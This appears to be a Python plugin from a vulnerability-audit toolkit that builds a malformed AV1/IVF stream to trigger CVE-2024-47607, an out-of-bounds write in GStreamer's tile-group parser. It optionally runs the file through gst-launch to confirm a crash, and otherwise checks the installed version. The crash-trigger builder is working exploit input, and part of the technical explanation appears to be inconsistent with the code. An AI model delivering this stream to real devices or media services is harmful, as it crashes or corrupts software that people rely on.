#!/usr/bin/env python3
"""CVE-2024-47607 – GStreamer AV1 codec out-of-bounds write in tile group parsing.

Public PoC reference: https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3848
Technique:
  gst_av1_parse_tile_group_obu() in gst/codecparsers/gstav1parser.c
  calculates a tile end position as:
      tile_end = tile_offset + tile_size_minus_1 + 1
  When tile_size_minus_1 = UINT64_MAX (0xFFFFFFFFFFFFFFFF), this wraps to 0
  and the subsequent write at tile_end bypasses bounds checks.

  Malformed OBU stream structure:
    - AV1 sequence header OBU (minimal)
    - Tile Group OBU with tile_size_minus_1 = 0xFFFFFFFFFFFFFF (or similar large value)

Attack surface: IVI media player, video conferencing codec, WebRTC.
"""
from __future__ import annotations

import struct
import tempfile
from pathlib import Path

import sys as _sys, subprocess as _subproc, re as _re
from pathlib import Path as _Path
_sys.path.insert(0, str(_Path(__file__).parent))
from probe_utils import version_in_range, detection_confidence
from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 21,
    "cve": "CVE-2024-47607",
    "year": 2024,
    "domain": "application",
    "vendor_product": "GStreamer (gst-plugins-bad AV1 parser)",
    "component": "gstav1parser.c gst_av1_parse_tile_group_obu",
    "type": "OOB write → RCE / DoS",
    "summary": (
        "tile_size_minus_1 = UINT64_MAX causes tile_end to wrap to 0, "
        "bypassing bounds checks and triggering an out-of-bounds write."
    ),
    "source_url": "https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3848",
    "requires_manual_review": True,
    "affected": [{"vendor": "GStreamer", "product": "GStreamer", "versions": [{"version": "<1.24.9", "status": "affected"}]}],
}


def _leb128(val: int) -> bytes:
    """Encode a value as LEB128."""
    result = b""
    while True:
        byte = val & 0x7F
        val >>= 7
        if val:
            result += bytes([byte | 0x80])
        else:
            result += bytes([byte])
            break
    return result


def _build_av1_obu(obu_type: int, payload: bytes, has_size: bool = True) -> bytes:
    """Build a minimal AV1 OBU with extension_flag=0, has_size=1."""
    header = bytes([(obu_type << 3) | (0x02 if has_size else 0)])
    if has_size:
        return header + _leb128(len(payload)) + payload
    return header + payload


def _build_malformed_av1_ivf() -> bytes:
    """
    Build a minimal IVF container with one frame containing:
      - AV1 Sequence Header OBU (minimal, 1-byte payload stub)
      - AV1 Tile Group OBU with tile_size_minus_1 = 0xFFFFFFFFFFFFFF (7-byte LEB128)
    """
    # AV1 Sequence Header OBU (type=1): minimal stub (not fully valid but passes early checks)
    seq_hdr_payload = bytes([0x08, 0x00, 0x00, 0x00, 0x04, 0x45, 0x9e, 0x3c, 0xc0])
    seq_hdr_obu = _build_av1_obu(1, seq_hdr_payload)

    # Tile Group OBU (type=4): header bits + tile_start_and_end_present_flag=0
    # LEB128-encoded tile_size_minus_1 = 0xFFFFFFFFFFFFFF (huge, triggers wrap)
    tg_header_bits = bytes([0x00])                  # tile_start_and_end_present_flag=0
    tile_size_leb  = bytes([0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f])  # huge value
    tile_data      = b'\xde\xad\xbe\xef' * 8       # nominal tile data
    tg_payload     = tg_header_bits + tile_size_leb + tile_data
    tg_obu         = _build_av1_obu(4, tg_payload)

    frame_data = seq_hdr_obu + tg_obu

    # IVF container header
    ivf_hdr  = b'DKIF'                              # signature
    ivf_hdr += struct.pack('<H', 0)                 # version
    ivf_hdr += struct.pack('<H', 32)                # header_size
    ivf_hdr += b'AV01'                              # fourcc
    ivf_hdr += struct.pack('<HH', 1920, 1080)       # width, height
    ivf_hdr += struct.pack('<II', 30, 1)            # fps_num, fps_den
    ivf_hdr += struct.pack('<I', 1)                 # frame_count
    ivf_hdr += struct.pack('<I', 0)                 # reserved

    # IVF frame header
    frame_hdr = struct.pack('<IQ', len(frame_data), 0)

    return ivf_hdr + frame_hdr + frame_data


def _run_poc(plugin):
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    stream = _build_malformed_av1_ivf()
    out = Path(tempfile.mkdtemp()) / "cve_2024_47607_av1_oob.ivf"
    out.write_bytes(stream)

    evidence = {
        "cve": "CVE-2024-47607",
        "stream_path": str(out),
        "stream_size_bytes": len(stream),
        "trigger": "AV1 Tile Group OBU with tile_size_minus_1=0xFFFFFFFFFFFFFF",
        "expected_behavior": "OOB write in gst_av1_parse_tile_group_obu → crash/RCE",
    }

    if allow_disruptive:
        import subprocess as _sp
        result = _sp.run(
            ["gst-launch-1.0", "filesrc", f"location={out}",
             "!", "ivfparse", "!", "av1parse", "!", "fakesink"],
            capture_output=True, text=True, timeout=15,
        )
        evidence["local_test_rc"]  = result.returncode
        evidence["local_test_out"] = (result.stdout + result.stderr)[:500]
        evidence["crashed"] = result.returncode in (-11, -6, 139) or \
                              "Segmentation" in (result.stdout + result.stderr)


    # ── Non-disruptive version probe ─────────────────────────────────────────
    _tool_out = ""
    try:
        _r = _subproc.run(
            'gst-inspect-1.0 --version', shell=True, capture_output=True, text=True, timeout=10
        )
        _tool_out = (_r.stdout + _r.stderr).strip()
    except Exception as _e:
        _tool_out = f"tool_error:{_e}"

    evidence["tool_version_output"] = _tool_out
    _ver_m = _re.search('GStreamer (\\d+\\.\\d+\\.\\d+)', _tool_out)
    _detected_ver = _ver_m.group(1) if _ver_m else None
    evidence["detected_version"] = _detected_ver

    if _detected_ver:
        _in_range = version_in_range(_detected_ver, lt='1.24.9')
        evidence["version_in_affected_range"] = _in_range
    else:
        _in_range = None
        evidence["version_detection"] = "tool not found or version not parseable"

    # ── Disruptive crash test ─────────────────────────────────────────────────
    _crash_confirmed = False
    if allow_disruptive:
        # (existing crash-test code above already populated evidence["crashed"])
        _crash_confirmed = evidence.get("crashed", False)

    # ── Verdict ───────────────────────────────────────────────────────────────
    if _crash_confirmed:
        _level = "A"
        _vuln  = True
    elif _in_range is True:
        _level = "C"
        _vuln  = True
    elif _in_range is False:
        _level = "C"
        _vuln  = False
    else:
        _level = "E"
        _vuln  = None

    evidence["poc_source"] = 'GStreamer gitlab issue #3848 / CVE-2024-47607'
    return {
        "vulnerable": _vuln,
        "evidence": evidence,
        "requires_manual_review": _vuln is None,
        "detection_confidence": detection_confidence(
            _level, evidence,
            "crash_confirmed" if _crash_confirmed else
            ("version_range" if _in_range is not None else "passive_only")
        ),
    }



class Poc75CVE202447607GstreamerAv1TileGroupOobWriteRceAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-APP-075"
    meta_poc_name   = 'CVE-2024-47607 GStreamer AV1 Tile Group 越界 Write RCE Active Validation'
    meta_cve_id     = "CVE-2024-47607"
    meta_severity   = "Critical"
    meta_protocol   = "local"
    meta_target_os  = ["linux", "android"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive"]
    meta_profiles   = ["application"]
    meta_source_url = "https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3848"
    meta_references       = ['https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/3848']
    meta_attack_surface = "GStreamer AV1 codec tile_size_minus_1 OOB write"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "75_GStreamer_Out_of_bounds_write_in_media_Audit") if "VULN" in dir() else "75_GStreamer_Out_of_bounds_write_in_media_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc75CVE202447607GstreamerAv1TileGroupOobWriteRceAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
